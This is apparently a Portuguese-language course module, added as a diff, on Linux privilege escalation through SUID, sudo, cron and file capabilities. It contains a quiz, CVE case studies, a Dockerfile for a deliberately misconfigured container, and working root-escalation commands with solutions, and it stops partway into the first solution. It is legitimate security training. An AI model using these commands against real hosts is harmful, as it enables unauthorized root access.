@@ -1,0 +1,618 @@
+---
+slug: privesc-linux-vetores
+track: trilha-6
+title: "PrivEsc Linux: SUID, cron, sudo, capabilities"
+prerequisites: [privesc-linux-enumeracao]
+lab: null
+tasks:
+  - slug: missao-1-suid
+    title: "Missão 1 — Root pelo SUID fora do padrão"
+    type: flag
+    prompt: "O conteúdo do arquivo /root/flag_suid.txt, que só o root lê. Você o obtém abrindo um shell com euid 0 pelo binário SUID que não deveria estar na lista. Cole no formato FLAG{...}."
+    hint: "Liste os SUID com find / -perm -4000 -type f 2>/dev/null. Um deles não é padrão. Procure esse binário no GTFOBins pela seção SUID: a receita usa -exec e um /bin/sh -p. O -p é o que impede o bash de largar o privilégio."
+    flag:
+      hash: "scrypt$16384$8$1$4a8c60862f37b9b79f316d84d1efb8ec54b38b55e3dcb68bf47519176ed8bd73"
+      salt: "52d3e4c5ed11e6bebfb139b80078cb65"
+  - slug: missao-2-sudo
+    title: "Missão 2 — Root por uma regra de sudo"
+    type: flag
+    prompt: "O conteúdo de /root/flag_sudo.txt, lido depois de virar root abusando da única regra que o sudo -l mostra. Cole no formato FLAG{...}."
+    hint: "sudo -l diz exatamente o que você pode rodar como root sem senha. Procure esse programa no GTFOBins, seção Sudo. É um binário que parece inofensivo, mas que executa um comando que você escolhe."
+    flag:
+      hash: "scrypt$16384$8$1$32654e42452768843269cbaec9928e2dd268551e5c82f7f91276e246630a7ef6"
+      salt: "c3431c3205d1dc936dd372318b56fe26"
+  - slug: missao-3-cron
+    title: "Missão 3 — Root por um cron de root"
+    type: flag
+    prompt: "O conteúdo de /root/flag_cron.txt, lido depois de fazer o cron de root trabalhar para você. Cole no formato FLAG{...}."
+    hint: "Cruze o cron (/etc/cron.d) com os arquivos graváveis por você. O script que o root roda é world-writable: reescreva-o para que, na próxima execução, o root deixe um /bin/bash com o bit SUID ligado para você. Depois é só /tmp/rootbash -p."
+    flag:
+      hash: "scrypt$16384$8$1$83e857a14a58e0b5c721e660ac42f8c5ec36563bb3b858c3d87975833921e524"
+      salt: "d3fb00587b853b10c15e3e32601a764c"
+  - slug: missao-4-capability
+    title: "Missão 4 — Root por uma capability"
+    type: flag
+    prompt: "O conteúdo de /root/flag_cap.txt, lido depois de virar root por um binário que carrega uma capability perigosa. Cole no formato FLAG{...}."
+    hint: "getcap -r / 2>/dev/null revela o binário marcado. A capability é cap_setuid: ela deixa o programa mudar o próprio uid para 0. Com um interpretador (python), peça os.setuid(0) e depois abra um shell."
+    flag:
+      hash: "scrypt$16384$8$1$bebfe72c4b26e463c6c95656228c1e11096447aa5dd631fe84d7b7f21e1a672b"
+      salt: "d96d2103136851e3f4a97070a2da1009"
+  - slug: quiz-final
+    title: "Quiz — PrivEsc Linux: SUID, cron, sudo, capabilities"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que um binário com o bit SUID de root executa com poder de root, mesmo quando é você, usuário comum, que o chama?"
+        options:
+          - "Porque o bit SUID adiciona você ao grupo root enquanto o programa roda"
+          - "Porque, ao executar um arquivo com o bit setuid ligado, o kernel define o euid (effective user ID) do processo como o dono do arquivo; se o dono é root, o processo passa a decidir permissões como root, mesmo que o seu uid real continue sendo o seu"
+          - "Porque o SUID desliga a checagem de permissões do kernel durante a execução"
+          - "Porque todo binário em /usr/bin roda como root por padrão"
+        answer: 1
+        explanation: "O bit setuid faz o kernel, no execve, colocar o euid do processo igual ao dono do arquivo. É o euid (não o uid real) que o kernel consulta para decidir o que o processo pode. Por isso o passwd (SUID root) consegue escrever em /etc/shadow a seu pedido. O bit não mexe em grupos nem desliga checagem nenhuma: ele só troca a identidade efetiva. O perigo é que todo SUID root é código rodando como root a pedido de qualquer um."
+      - question: "O sudo -l mostra `(root) NOPASSWD: /usr/bin/env`. Por que isso é um caminho direto para root, se env só imprime ou ajusta variáveis de ambiente?"
+        options:
+          - "Não é: env é inofensivo, a regra é segura"
+          - "Porque o NOPASSWD transforma qualquer comando em root, inclusive o seu shell atual"
+          - "Porque o env sabe executar um programa depois de ajustar o ambiente (env COMANDO), então sudo env /bin/sh roda um shell como root — o GTFOBins cataloga exatamente essa 'fuga' (shell escape)"
+          - "Porque env tem um bug de buffer overflow"
+        answer: 2
+        explanation: "O risco não é o que o env faz de 'normal', e sim o que ele PODE fazer: env recebe um comando para executar depois de montar o ambiente. Como o sudo o roda como root, sudo env /bin/sh te dá um shell de root. Não há bug nenhum — é uso legítimo do env virando escalação. O GTFOBins existe justamente para catalogar quais binários, rodados por sudo, deixam você executar algo seu. A lição: dar NOPASSWD a um binário que executa outros programas é dar root."
+      - question: "No vetor de cron, por que reescrever um script world-writable rodado pelo root é mais confiável e mais silencioso do que um kernel exploit?"
+        options:
+          - "Porque o script é o bisturi: você controla o conteúdo, o root o executa sozinho na próxima janela, não há risco de derrubar a máquina e o 'ataque' é só uma edição de arquivo — enquanto um kernel exploit pode travar o host e acende mais alarmes"
+          - "Porque o kernel exploit não funciona em contêineres"
+          - "Porque o cron roda com mais privilégio que o kernel"
+          - "Porque o script já é root e você só precisa lê-lo"
+        answer: 0
+        explanation: "É a mesma priorização do 6.1 e do 6.2: confiabilidade, ruído e estabilidade. Um script que VOCÊ escreve e que o root executa por conta própria é quase garantido, estável e discreto (uma escrita de arquivo). O kernel exploit é o martelo: poderoso, mas pode panificar a máquina e é mais barulhento. Cron não roda 'acima' do kernel, e o ponto não é ler o script — é que ele roda COMO root e é gravável por você."
+      - question: "Um binário comum (uma cópia do python) aparece no getcap com `cap_setuid=ep`. Por que isso é equivalente a um SUID root para quem quer escalar?"
+        options:
+          - "Não é: capability é mais fraca que SUID e nunca dá root"
+          - "Porque a capability transforma o arquivo em SUID automaticamente"
+          - "Porque ep significa 'executa como root sempre'"
+          - "Porque cap_setuid permite ao processo chamar setuid(0) e assumir o uid 0; com um interpretador, basta os.setuid(0) e abrir um shell — você vira root sem o binário ser SUID"
+        answer: 3
+        explanation: "As Linux capabilities fatiam o poder do root em pedaços. cap_setuid é o pedaço que permite trocar o uid à vontade — inclusive para 0. Um binário que carrega essa capability e que executa código seu (um interpretador) é root disfarçado: python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'. Não vira SUID, não precisa: a capability já dá o poder. Por isso getcap -r / entra na enumeração ao lado do find de SUID."
+      - question: "Ao abrir o shell pelo SUID, muita gente faz /bin/sh e cai de volta como usuário comum. Por quê, e o que o `-p` resolve?"
+        options:
+          - "O -p roda o shell em segundo plano"
+          - "Porque, por padrão, bash e sh largam o privilégio quando percebem que o euid difere do uid real (uma proteção contra scripts SUID); o -p (privileged) manda o shell NÃO largar o euid 0, mantendo o root"
+          - "Porque /bin/sh está quebrado e só /bin/bash funciona"
+          - "Porque falta rodar sudo antes"
+        answer: 1
+        explanation: "bash e sh têm uma defesa embutida: se o euid não bate com o uid real (sinal de que foram chamados de um contexto SUID), eles baixam o euid de volta ao uid real na inicialização, justamente para não entregar root de graça. O -p desliga essa defesa e preserva o euid 0. É por isso que as receitas do GTFOBins trazem /bin/sh -p. Sem o -p, você 'vira root' por um instante e o shell devolve o privilégio sozinho."
+      - question: "O contêiner de treino é iniciado com a opção `--security-opt no-new-privileges`. Você tenta o SUID find e o euid continua 1000. Por quê?"
+        options:
+          - "Porque no-new-privileges diz ao kernel para ignorar os bits setuid/setgid e as capabilities de arquivo naquele processo e em todos os seus filhos: nenhum execve pode GANHAR privilégio, então o SUID não eleva nada"
+          - "Porque o find foi removido"
+          - "Porque o contêiner não tem root"
+          - "Porque o find precisa de internet"
+        answer: 0
+        explanation: "no-new-privileges é um sinalizador por processo (herdado pelos filhos) que proíbe ganhar privilégio num execve: o kernel passa a ignorar o bit SUID e as capabilities de arquivo. É uma das defesas mais eficazes contra toda a família 'SUID/capability': o vetor some. É também por isso que o linux-sandbox dos módulos da Trilha 0 — que roda com essa opção e cap_drop ALL — não serve para praticar escalação. Ele foi endurecido de propósito."
+      - question: "Na vida real, a CVE-2021-3156 (Baron Samedit) permitiu virar root pelo próprio sudo, em configuração padrão, por quase dez anos. Qual a lição que ela ensina sobre o vetor 'SUID/sudo'?"
+        options:
+          - "Que o sudo é inútil e deve ser desinstalado"
+          - "Que só versões modificadas do sudo são vulneráveis"
+          - "Que um binário SUID root confiável também é código rodando como root: se ele tiver um bug de memória, não é preciso nem uma má configuração — o próprio programa legítimo vira a rampa. Por isso manter o sudo atualizado é controle de escalação, não só de 'atualização genérica'"
+          - "Que a falha dependia de o sudoers estar mal configurado"
+        answer: 2
+        explanation: "Baron Samedit (CVE-2021-3156) foi um heap overflow no próprio sudo, explorável na configuração PADRÃO — sem nenhuma regra mal feita. Mostra o outro lado do vetor SUID: além do 'SUID que não deveria estar lá' e do 'sudo mal configurado', existe o 'SUID confiável com um bug'. O sudo é SUID root; um erro de memória nele é root para qualquer usuário local. A defesa é patch: atualizar o sudo é, literalmente, fechar um caminho de escalação."
+glossary:
+  - term: NOPASSWD
+    definition: "A etiqueta no sudoers que libera um usuário a rodar um comando via sudo sem digitar a senha. Conveniente para automação, perigosa quando aponta para um binário que executa outros programas (um editor, um pager, env): vira root sem nem precisar da senha."
+  - term: no-new-privileges
+    definition: "Um sinalizador por processo (herdado pelos filhos) que proíbe ganhar privilégio num execve: o kernel passa a ignorar o bit setuid/setgid e as capabilities de arquivo. Mata de uma vez toda a família de escalação por SUID e capabilities; é uma das defesas mais eficazes do Linux moderno e de contêineres."
+  - term: wildcard injection
+    definition: "Técnica em que um comando com curinga (por exemplo tar * ou chown * num cron de root) expande nomes de arquivo que você criou e que viram opções do programa (como --checkpoint-action), fazendo-o executar o que você quer. O curinga não distingue 'nome de arquivo' de 'opção'."
+  - term: LD_PRELOAD
+    definition: "Variável de ambiente que força o carregamento de uma biblioteca antes de todas as outras, permitindo sobrescrever funções. Quando o sudo preserva essa variável (env_keep) e deixa você rodar algo como root, uma biblioteca sua é carregada dentro do processo privilegiado — e roda como root."
+---
+
+import vetoresParaRoot from "./img/vetores-para-root.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No 6.2 você aprendeu a **enxergar**: caiu num <GlossaryTerm term="foothold">foothold</GlossaryTerm> (o acesso inicial, de onde se executa comando no alvo) como uma conta de baixo privilégio e enumerou, à mão e com LinPEAS/pspy, tudo que a máquina revela. O resultado daquela fase é uma lista curta de **candidatos**: um binário <GlossaryTerm term="SUID">SUID</GlossaryTerm> fora do padrão, uma regra de `sudo` generosa demais, um script de root gravável por você, um binário carregando uma <GlossaryTerm term="Linux capabilities">capability</GlossaryTerm> perigosa. Agora vem o outro verbo: **disparar**. Este módulo é onde a enumeração vira `uid=0`.
+
+Os quatro vetores do título — SUID, `cron`, `sudo` e `capabilities` — não são truques soltos. São as quatro formas mais comuns, no mundo real, de um `www-data` ou um `daemon` virar <GlossaryTerm term="root">root</GlossaryTerm> num host Linux, e caem todas na mesma regra que o 6.1 cravou: **o vetor mora no cruzamento entre o que você controla e o que tem poder.** Entender os quatro te dá a espinha dorsal da <GlossaryTerm term="local privilege escalation">local privilege escalation</GlossaryTerm> (escalação de privilégio local) em Linux — e, de quebra, te ensina a reconhecê-los quando é você quem precisa fechá-los.
+
+**Ao final, você vai saber:**
+
+- explicar por que um binário SUID root roda com poder de root, e abrir um shell de root por um SUID fora do padrão (com o truque do `-p`);
+- ler uma regra de `sudo` com o <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm> e transformá-la num shell de root;
+- sequestrar um `cron` de root que executa um script <GlossaryTerm term="world-writable">world-writable</GlossaryTerm> (gravável por qualquer um);
+- encontrar e abusar de uma file capability (`cap_setuid`) para assumir o `uid` 0;
+- defender um host contra os quatro vetores — e dizer por que `no-new-privileges` mata quase todos de uma vez.
+
+**Pré-requisitos:** 6.2 — PrivEsc Linux: enumeração (deste módulo você usa a lista de candidatos: SUID, `sudo -l`, `getcap`, `cron` e arquivos graváveis já enumerados).
+
+**Tempo estimado:** 3 a 4 horas, incluindo o alvo de treino.
+
+<Callout variant="ethics">
+Escalar privilégio é obter poder que não foi dado a você. Fora de um ambiente autorizado, isso é crime (no Brasil, a Lei 12.737/2012 — ver 1.4). Tudo aqui se faz num contêiner descartável, na sua própria máquina, sem rede. Nunca em um sistema que não é seu ou para o qual você não tem autorização por escrito.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+Antes de disparar, é preciso entender **por que** cada vetor existe. Os quatro compartilham uma raiz: o Linux precisa, o tempo todo, deixar código de baixo privilégio tocar em coisas de alto privilégio — trocar sua senha, rodar uma manutenção agendada, abrir uma porta baixa. Cada mecanismo que permite isso é, ao mesmo tempo, uma ponte e um risco. A escalação acontece quando a ponte foi construída larga demais.
+
+<Figure
+  src={vetoresParaRoot}
+  alt="Diagrama dos quatro vetores (SUID, sudo, cron, capabilities) partindo de uma conta de baixo privilégio e convergindo para uma caixa root (uid 0), cada um anotado com o que o atacante controla e de onde vem o poder."
+  caption="Os quatro caminhos deste módulo. Todos saem da mesma conta sem poder e chegam ao mesmo uid 0; o que muda é onde está a ponte mal construída."
+/>
+
+### 2.1 uid real, uid efetivo e o bit SUID
+
+Todo processo no Linux carrega mais de uma identidade. As duas que importam aqui são o **uid real** (quem você é — herdado de quem iniciou o processo) e o <GlossaryTerm term="effective user ID">effective user ID</GlossaryTerm> (euid, o uid efetivo — a identidade que o kernel consulta para decidir o que o processo pode fazer). Quase sempre os dois são iguais. O bit **SUID** (set user ID) existe para separá-los de propósito.
+
+Quando um arquivo executável tem o bit setuid ligado, o kernel, no momento do `execve` (a chamada que troca a imagem do processo pelo novo programa), define o **euid do novo processo como o dono do arquivo**. Se o dono é root, o processo passa a decidir permissões como root — mesmo que o seu uid real continue sendo o seu. É assim que o `/usr/bin/passwd`, um binário SUID root, consegue escrever no `/etc/shadow` (que é de root) a pedido de um usuário comum: ele *roda* como root.
+
+Essa é a primeira grande superfície, e o 6.1 já a anunciou: **todo binário SUID root é um pedaço de código que roda como root a pedido de qualquer um.** Se esse código puder ser levado a executar algo que *você* escolhe — e muitos podem —, o seu euid vira 0. O `find`, por exemplo, tem a opção `-exec`, que roda um comando arbitrário; se o `find` for SUID root, esse comando roda como root. O GTFOBins cataloga exatamente isso: não "o que roda como root", mas "o que roda como root **e me deixa executar algo meu**".
+
+Há um detalhe que derruba muito iniciante, e vamos tratá-lo desde já porque é teoria, não truque. O `bash` e o `sh` têm uma defesa embutida: ao iniciar, se percebem que o euid é diferente do uid real (sinal de que foram chamados de um contexto SUID), eles **baixam o euid de volta** ao uid real — para não entregar um shell de root sem querer. A opção `-p` (privileged) desliga essa defesa e **preserva** o euid. É por isso que as receitas do GTFOBins terminam em `/bin/sh -p`. Sem o `-p`, você "vira root" por um instante e o shell devolve o privilégio sozinho.
+
+### 2.2 sudo: delegar poder sem virar root
+
+O `sudo` resolve um problema real: você quer deixar a Ana reiniciar o servidor web, mas não quer dar a senha de root a ela. O arquivo <GlossaryTerm term="sudoers">sudoers</GlossaryTerm> (`/etc/sudoers` e os pedaços em `/etc/sudoers.d/`) é a **política**: diz quem pode rodar o quê, como quem. Uma linha como `ana ALL=(root) /usr/sbin/service apache2 restart` dá à Ana exatamente aquilo, e nada mais.
+
+O problema nasce de uma confusão sutil entre dois conceitos: "rodar *este programa* como root" não é o mesmo que "rodar *só aquilo* como root". Se o programa delegado souber executar outro programa — um editor que abre um shell (`:!sh` no `vim`), um pager que escapa para o shell (`!sh` no `less`), ou o `env`, que roda qualquer comando depois de ajustar o ambiente —, então dar o programa é dar um shell de root. A etiqueta <GlossaryTerm term="NOPASSWD">NOPASSWD</GlossaryTerm>, que dispensa a senha, só piora: a escalação nem exige que você saiba a senha do usuário. O GTFOBins tem uma seção **Sudo** inteira dedicada a esses escapes (<GlossaryTerm term="shell escape">shell escape</GlossaryTerm>).
+
+E há o caso mais perverso, que você verá na seção 4: o próprio `sudo`, sendo um binário SUID root gigante e cheio de parsing de linha de comando, pode ter **bugs de memória**. Aí não é preciso nem uma regra mal feita — o programa legítimo, em configuração padrão, vira a rampa.
+
+### 2.3 cron: o root que trabalha sozinho, de hora em hora
+
+O <GlossaryTerm term="cron">cron</GlossaryTerm> é o agendador clássico do Unix: lê tabelas de tarefas (`/etc/crontab`, os arquivos em `/etc/cron.d/`, os crontabs por usuário) e executa cada linha no horário marcado, **com o usuário que a tabela indica** — muitas vezes root. É o motor por trás de backups noturnos, rotação de logs e manutenção.
+
+O vetor aqui é indireto e, por isso, elegante. Você não ataca o `cron`; você ataca **o que ele executa**. Se uma dessas tarefas roda, como root, um script que *você* pode reescrever (um script <GlossaryTerm term="world-writable">world-writable</GlossaryTerm>, ou dentro de um diretório que você controla), então você escreve o que quiser dentro dele e **espera**. Na próxima janela, o root executa o seu código por conta própria. É o cruzamento do 6.1 em estado puro: você controla o *conteúdo*, o root fornece o *poder*, e o cron os junta sem você levantar suspeita. Os `systemd` timers (<GlossaryTerm term="systemd unit">unidades</GlossaryTerm> `.timer`) são a versão moderna do mesmo mecanismo — e do mesmo risco.
+
+### 2.4 capabilities: o root fatiado
+
+Historicamente, o Linux só conhecia dois mundos: root (uid 0, que pode tudo) e o resto. Isso é grosseiro — um servidor web que precisa só **abrir a porta 80** (uma ação privilegiada) tinha de rodar como root inteiro. As **Linux capabilities** (introduzidas no kernel 2.2) quebraram o poder do root em cerca de quarenta pedaços independentes. `CAP_NET_BIND_SERVICE` é "pode abrir portas baixas". `CAP_DAC_OVERRIDE` é "pode ignorar as permissões de leitura/escrita dos arquivos". E `CAP_SETUID` é "pode trocar o próprio uid à vontade".
+
+A ideia é ótima — dar a cada programa só o pedaço de que precisa (o <GlossaryTerm term="least privilege">least privilege</GlossaryTerm> na prática). Mas um pedaço mal escolhido é root disfarçado. Um binário com `cap_setuid` e que execute código seu (um interpretador como o `python`) pode simplesmente chamar `setuid(0)` e se tornar root — sem ser SUID, sem `sudo`, sem cron. As capabilities ficam gravadas no arquivo (*file capabilities*) e são lidas com o `getcap`; por isso `getcap -r /` entra na enumeração ao lado do `find` de SUID. Um `cap_setuid=ep` num binário que não seja parte do sistema é tão grave quanto um SUID root fora do padrão.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos ver cada vetor em ação, com comandos e saídas reais do alvo de treino que você vai montar na seção 5. Em todos, o ponto de partida é sempre o mesmo: você é uma conta sem poder.
+
+```console
+$ id
+uid=1000(app) gid=1000(app) groups=1000(app)
+```
+
+**SUID.** Primeiro, a lista de binários SUID. O `2>/dev/null` cala os "Permission denied" (como no 6.2):
+
+```console
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/find
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/sudo
+```
+
+Os de sempre estão aí (`passwd`, `su`, `mount`, `sudo`). O que salta aos olhos é o `/usr/local/bin/find`: `find` **não** é um SUID padrão, e está em `/usr/local/bin` (onde entra coisa instalada à mão). Pelo GTFOBins, um `find` SUID vira shell com `-exec`. O `-p` preserva o euid 0:
+
+```console
+$ /usr/local/bin/find . -maxdepth 0 -exec /bin/sh -p \;
+$ id
+uid=1000(app) gid=1000(app) euid=0(root) groups=1000(app)
+```
+
+O `uid` real continua 1000, mas o `euid` é 0: para o kernel, você é root. A partir daqui, `/root` se abre.
+
+**sudo.** O `sudo -l` lista o que você pode rodar como root. Aqui, uma regra `NOPASSWD`:
+
+```console
+$ sudo -l
+User app may run the following commands on localhost:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+O `env` parece inofensivo, mas ele executa um comando depois de montar o ambiente — e o GTFOBins (seção Sudo) traz a receita. Como o `sudo` o roda como root, o shell que ele abre é de root:
+
+```console
+$ sudo env /bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Repare: aqui o `uid` **real** é 0, não só o efetivo. É root pleno.
+
+**cron.** Cruze o `cron` com os arquivos graváveis. A tarefa roda como root; o script é `rwxrwxrwx`:
+
+```console
+$ cat /etc/cron.d/healthcheck
+* * * * * root /opt/maint/healthcheck.sh
+$ ls -l /opt/maint/healthcheck.sh
+-rwxrwxrwx 1 root root 38 ... /opt/maint/healthcheck.sh
+```
+
+Você reescreve o script para que o root, na próxima execução, deixe uma cópia do `bash` com o bit SUID ligado para você:
+
+```console
+$ printf '\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n' >> /opt/maint/healthcheck.sh
+```
+
+Em até um minuto, o cron roda como root e cria o `/tmp/rootbash` SUID root. Aí o `-p` de novo:
+
+```console
+$ ls -l /tmp/rootbash
+-rwsr-xr-x 1 root root 1298416 ... /tmp/rootbash
+$ /tmp/rootbash -p
+$ id
+uid=1000(app) gid=1000(app) euid=0(root) groups=1000(app)
+```
+
+**capabilities.** O `getcap` varre as file capabilities:
+
+```console
+$ getcap -r / 2>/dev/null
+/usr/local/bin/pythoncap cap_setuid=ep
+```
+
+Um `python` com `cap_setuid`. Peça a ele que troque o próprio uid para 0 e abra um shell:
+
+```console
+$ /usr/local/bin/pythoncap -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=1000(app) groups=1000(app)
+```
+
+Quatro pontes, quatro `uid=0`. Nenhuma exigiu um exploit escrito sob medida — só o conhecimento de onde a ponte estava larga demais.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Baron Samedit — CVE-2021-3156 (2021)
+
+Em **26 de janeiro de 2021**, a Qualys divulgou uma falha no próprio `sudo`, apelidada de **Baron Samedit**. Era um *heap-based buffer overflow* (estouro de buffer na heap): quando o `sudo` roda em modo shell via `sudoedit -s`, um argumento terminado em uma barra invertida (`\`) não escapada faz o `sudo` ler além do fim de uma string. Como o `sudo` é SUID root, explorar esse bug dava **root a qualquer usuário local** — sem precisar de senha e **na configuração padrão**, sem nenhuma regra de `sudoers` mal feita.
+
+O mais assustador foi a longevidade: o bug foi introduzido em julho de 2011 e ficou explorável por quase **dez anos**, afetando o `sudo` 1.8.2 a 1.8.31p2, o 1.9.0 a 1.9.5p1 e as versões legadas 1.7.7 a 1.7.10p9 — ou seja, praticamente toda instalação Linux e Unix da década. A correção veio no `sudo` 1.9.5p2 (e 1.8.32).
+
+- **Impacto:** escalação local para root em configuração padrão, em quase todo host com `sudo` por ~10 anos; CVSS v3.1 **7.8 (High)**.
+- **Lição:** este é o terceiro rosto do vetor SUID/sudo. Além do "SUID que não deveria estar lá" (missão 1) e do "sudo mal configurado" (missão 2), existe o **"SUID confiável com um bug"**. O `sudo` é SUID root; um erro de memória nele é root para qualquer usuário local. Manter o `sudo` atualizado **é** controle de escalação de privilégio, não apenas higiene genérica.
+- **Fonte:** [Sudo advisory — CVE-2021-3156 (Baron Samedit)](https://www.sudo.ws/security/advisories/unescape_overflow/).
+
+### O bypass do `!root` — CVE-2019-14287 (2019)
+
+Um caso que mostra o outro lado: a *lógica* do `sudo`, não a memória. Em **14 de outubro de 2019** (correção no `sudo` 1.8.28), revelou-se que uma regra que tentava *proibir* o root ainda deixava virar root. Se o `sudoers` tivesse algo como `bob myhost = (ALL, !root) /usr/bin/vi` — "o Bob pode rodar o `vi` como qualquer um, menos root" —, bastava `sudo -u#-1 vi`. O uid `-1` (ou `4294967295`) não é trocado pelas chamadas `setresuid`/`setreuid`, então o processo **continuava root**, driblando o `!root`. Os logs ainda registravam o alvo como `4294967295`.
+
+- **Impacto:** em sistemas com regras `(ALL, !root)`, um usuário autorizado a rodar um comando como "qualquer um menos root" conseguia rodá-lo exatamente como root. Afetou o `sudo` anterior a 1.8.28.
+- **Lição:** "negar o root" numa regra de `sudo` não é o mesmo que o usuário não conseguir root. A superfície do `sudo` é a política **e** o parser que a interpreta.
+- **Fonte:** [Sudo advisory — CVE-2019-14287 (Runas bypass)](https://www.sudo.ws/security/advisories/minus_1_uid/).
+
+## 5. Mãos à obra — da shell comum ao root, por quatro caminhos
+
+Este módulo não tem lab próprio na plataforma. O motivo é de segurança (e está registrado no projeto): um alvo de escalação é, por definição, uma máquina **mal configurada de propósito**, e a plataforma só orquestra alvos consagrados (DVWA, Juice Shop...). Então você vai montar, **na sua própria máquina (WSL)**, um contêiner descartável de treino — como no 6.2, mas um degrau acima: lá você lia uma árvore de arquivos; aqui você precisa de um limite de privilégio **de verdade**, e um contêiner oferece isso com total isolamento (o root de dentro do contêiner **não** é o root do seu WSL — lembre do 6.1).
+
+<Callout variant="info" title="Por que um contêiner, e não o seu WSL direto">
+Plantar um binário SUID root, uma regra de `sudo` e um `cron` de root **no seu sistema real** seria arriscado e bagunçado. No contêiner, tudo isso vive preso: `--network none` (sem rede), `--rm` (some ao sair), e o `uid 0` de lá não tem poder nenhum sobre o seu Windows/WSL. É o ambiente certo para praticar escalação sem risco.
+</Callout>
+
+**Objetivo:** ao terminar, você terá chegado a `uid=0` (root) de **quatro** formas independentes — SUID, `sudo`, `cron` e capability — e lido quatro arquivos que só o root lê. Cada arquivo é a flag de uma missão.
+
+### 5.1 Montar o alvo de treino (passo a passo)
+
+Abra o terminal do Ubuntu (WSL). Crie uma pasta de trabalho e os dois arquivos abaixo. O primeiro é o `Dockerfile` (a receita da máquina mal configurada); o segundo é o `entrypoint.sh` (liga o `cron` e te deixa como o usuário sem poder).
+
+<CodeBlock
+  title="~/privesc-lab/Dockerfile"
+  lang="text"
+  code={`FROM debian:trixie-slim
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update \\
+ && apt-get install -y --no-install-recommends \\
+    sudo cron libcap2-bin python3 procps findutils \\
+ && rm -rf /var/lib/apt/lists/*
+
+# Conta de baixo privilégio onde você cai.
+RUN useradd --create-home --shell /bin/bash --uid 1000 app
+
+# Quatro flags que só o root lê, uma por caminho.
+RUN printf 'FLAG{suid-...}\\n'  > /root/flag_suid.txt \\
+ && printf 'FLAG{sudo-...}\\n'  > /root/flag_sudo.txt \\
+ && printf 'FLAG{cron-...}\\n'  > /root/flag_cron.txt \\
+ && printf 'FLAG{cap-...}\\n'   > /root/flag_cap.txt  \\
+ && chmod 600 /root/flag_*.txt
+
+# Vetor 1 — SUID: cópia do find com o bit setuid de root.
+RUN cp /usr/bin/find /usr/local/bin/find \\
+ && chmod 4755 /usr/local/bin/find
+
+# Vetor 2 — sudo: regra NOPASSWD para o env.
+RUN echo 'app ALL=(root) NOPASSWD: /usr/bin/env' > /etc/sudoers.d/90-app \\
+ && chmod 440 /etc/sudoers.d/90-app
+
+# Vetor 3 — cron: job de root rodando um script gravável por todos.
+RUN install -d -m 755 /opt/maint \\
+ && printf '#!/bin/sh\\n:\\n' > /opt/maint/healthcheck.sh \\
+ && chmod 777 /opt/maint/healthcheck.sh \\
+ && echo '* * * * * root /opt/maint/healthcheck.sh' > /etc/cron.d/healthcheck \\
+ && chmod 644 /etc/cron.d/healthcheck
+
+# Vetor 4 — capability: cópia do python com cap_setuid.
+RUN cp /usr/bin/python3 /usr/local/bin/pythoncap \\
+ && setcap cap_setuid+ep /usr/local/bin/pythoncap
+
+COPY entrypoint.sh /usr/local/sbin/entrypoint.sh
+RUN chmod 755 /usr/local/sbin/entrypoint.sh
+ENTRYPOINT ["/usr/local/sbin/entrypoint.sh"]`}
+/>
+
+<CodeBlock
+  title="~/privesc-lab/entrypoint.sh"
+  lang="bash"
+  code={`#!/bin/sh
+# Mapeia o hostname (evita um aviso do sudo), liga o cron como root e
+# entrega o terminal para o usuario sem privilegio 'app'.
+echo "127.0.0.1 localhost $(hostname)" > /etc/hosts
+cron
+exec runuser -u app -- /bin/bash -l`}
+/>
+
+As flags no `Dockerfile` acima estão com reticências de propósito — se eu as escrevesse por extenso, a plataforma guardaria a resposta em texto puro, o que o padrão proíbe. **Troque cada `FLAG{...}` por um valor só seu** (qualquer texto no formato `FLAG{algo}`); o que você digitar no cartão de cada missão é esse valor. Agora construa a imagem (isto usa a internet da sua máquina, uma vez só) e suba o contêiner **sem rede**:
+
+```console
+$ cd ~/privesc-lab
+$ docker build -t privesc-lab:local .
+$ docker run -it --rm --network none --hostname privesc privesc-lab:local
+```
+
+Você cai num shell. Confirme quem é:
+
+```console
+$ id
+uid=1000(app) gid=1000(app) groups=1000(app)
+```
+
+Uma conta sem grupos interessantes, exatamente como um `foothold` real. A partir daqui, as quatro missões.
+
+<Callout variant="tip" title="Se o docker reclamar de permissão">
+Se `docker` pedir `sudo`, rode os comandos com `sudo docker ...`, ou adicione seu usuário ao grupo `docker` (lembre do 6.2: estar no grupo `docker` já é, por si só, um caminho para root no host — por isso ele é um grupo poderoso). No WSL com Docker Desktop isso costuma já estar pronto.
+</Callout>
+
+### 5.2 Missão 1 — Root pelo SUID fora do padrão (guiada)
+
+Você quer root, e o caminho mais barato de verificar é a lista de SUID. Comece guiado:
+
+```console
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/find
+/usr/bin/passwd
+/usr/bin/umount
+...
+/usr/bin/sudo
+```
+
+A maioria é padrão do sistema. Um não é: o `find` não costuma ser SUID, e está em `/usr/local/bin`. Seu objetivo: abrir um shell com `euid=0` por esse binário e ler `/root/flag_suid.txt`.
+
+<Hint title="Dica 1 — o GTFOBins">
+Procure `find` no [GTFOBins](https://gtfobins.github.io/) e abra a seção **SUID**. A receita usa `-exec` para rodar um shell. O detalhe que não pode faltar é o `-p` no `/bin/sh`, senão o shell devolve o privilégio (releia a seção 2.1).
+</Hint>
+
+<Solution title="Solução">
+```console
+$ /usr/local/bin/find . -maxdepth 0 -exec /bin/sh -p \;
+$ id
+uid=1000(app) gid=1000(app) euid=0(root) groups=1000(app)
+$ cat /root/flag_suid.txt
+```
+
